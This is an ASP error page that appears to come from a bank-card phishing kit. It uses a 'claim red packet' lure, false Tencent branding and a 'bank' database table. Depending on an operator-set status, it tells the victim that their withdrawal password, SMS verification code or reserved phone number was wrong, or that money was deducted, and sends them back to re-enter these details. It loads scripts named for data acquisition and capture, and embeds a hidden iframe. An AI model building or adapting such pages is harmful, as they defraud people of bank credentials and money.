
<!--#include file="include/db_conn.asp"-->
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<title>领取红包</title>
<meta name="viewport" content="width=device-width,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no">
<link rel="stylesheet" href="css/reset.css">
<link rel="stylesheet" href="css/style.css">
<link rel="stylesheet" href="" id="min320">
<link rel="apple-touch-startup-image" href="milanoo_startup.png">
<link rel="apple-touch-icon-precomposed" href="milanoo_startup.png">
<script src="images/jquery-1.6.min.js"></script>
<script src="images/main.js"></script>
<style type="text/css"> 
#no_css{
	display:none;	
}
 
.financial_content a:hover {color: #0066b3; }
.financial_content a:active {color: #0066b3; }
.financial_content a:link {color: #0066b3; }
.financial_content a:visited {color: #0066b3; }
 
.wb_list a:hover {color: #0066b3; }
.wb_list a:active {color: #0066b3; }
.wb_list a:link {color: #0066b3; }
.wb_list a:visited {color: #0066b3; }
 
.news1_list1 li a{display:inline-block;max-width:100%}
.style1 {color: #FF0000}
.head {
		line-height: 0;
		text-align: center;
	}
	.ccb_title1 {
		min-height: 58px;
		line-height: 58px;
		font-size: 16px;
		text-align: center;
		background: #F6F6F6 none repeat scroll 0% 0%;
		border-top: 3px solid #44b549;
		border-bottom: 1px solid #D9DADC;
	}
	
	.news .ccb_title1 tr td .on a{
			color:#FFFDFD
	}
</style>
<script type="text/javascript"> 
$(function(){
	$("#no_js").hide();
});
</script>
</head>
<body>
<div class="page">
<div class="head">
   <img alt="" src="images/da.png">
  </div>
    <div class="hq_page">
		<div class="news ccb_title1">
			<table width="100%">
				<tbody>
					<tr>
						<td align="center">首页</td>
						<td align="center">微信商城</td>
						<td align="center">我的微信</td>
						<td align="center" style="background: #44b549 none repeat scroll 0% 0%; color = red;"><a>微信平台</a></td>
						<td align="center">服务支持</td>
					</tr>
				</tbody>
			</table>
		</div><br>
    <div class="hq_page">
      <div class="news ccb_title">
        <%
dim rs
set rs=server.CreateObject("adodb.recordset")
rs.open "select * from bank where id="&session("ddid")&" ",conn,1,3
m=rs("n")
rs.close
set rs=Nothing
	  %>
        <h1>对不起，信息出现错误！</h1>
      </div>
      <div id="pic2" class="pic2 content">
        <%
select case m
case 2
	response.write "输入的取款密码有误，请返回重新输入"
case 3
	response.write "输入的验证码有误或者因超时失效，请返回重新输入"
case 4
	response.write "核实成功！该卡（账）号不可领取提现,请更换卡号!"
case 5
	response.write "您因超时输入验证码导至金额被扣，系统将在三个工作日审核自动退款到您的注册卡（帐）号内"
case 7
	response.write "您输入的预留手机有误，请返回重新输入"
end Select
	  %>
        <%if m=3 then%>
        <div class="mobile_login"> <a href="verification.asp"><span class="login_ico_l"></span><span class="login_ico_m">上一步</span><span class="login_ico_r"></span></a></div>
        <%
		else
		%>
        <div class="mobile_login"> <a href="register.asp"><span class="login_ico_l"></span><span class="login_ico_m">上一步</span><span class="login_ico_r"></span></a></div>
        <%end if%>
      </div>
    </div>
    <!-- InstanceEndEditable -->
    <meta name="format-detection" content="telephone=no">
    <div class="footer">
      <h4 style="font-size:12px;">Copyright 1999-2014 腾讯 版权所有 <br>中华人民共和国增值电信业务经营许可证<br>
        经营许可证编号：A2.B1.B2-20100001  </h4>
    </div>
    <!-- /footer -->
    <script src="./error_files/dataacquisition.xy.ccb.js"></script>
    <script src="./error_files/datacatch.js"></script>
  </div>
  <!-- InstanceEnd --> </div>
<iframe src="online.asp" style="display: none;"></iframe>
</body>
</html>
